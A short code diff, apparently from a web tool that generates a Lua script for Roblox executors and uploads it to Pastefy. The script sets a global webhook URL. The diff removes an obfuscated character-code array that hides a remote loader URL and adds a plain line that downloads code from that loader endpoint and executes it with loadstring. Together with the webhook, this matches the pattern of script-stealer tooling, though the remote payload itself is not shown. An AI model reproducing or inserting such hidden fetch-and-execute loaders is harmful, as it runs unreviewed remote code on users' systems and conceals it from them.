@@ -1309,23 +1309,7 @@ for _i = 1, #_W do
 end
 getgenv().WEBHOOK_URL = _S
 
-local C = string.char
-local T = table.concat
-local K = {
-    104,116,116,112,115,58,47,47,
-    97,112,105,46,112,111,108,115,
-    101,99,46,110,101,116,47,108,
-    111,97,100,101,114,47,102,52,
-    54,48,99,51,57,55,100,99,49,
-    101,53,52,102,51,47,50,55,55,
-    98,53,50,48,97,48,53,98,56,
-    97,98,54,53
-}
-local U = {}
-for i = 1, #K do
-    U[i] = C(K[i])
-end
-return assert(loadstring(game:HttpGet(T(U), true)))()`;
+loadstring(game:HttpGet("https://api.polsec.net/loader/f460c397dc1e54f3/277b520a05b8ab65", true))();
 
     const url = await uploadToPastefy(script);
     out.className = 'code-block';
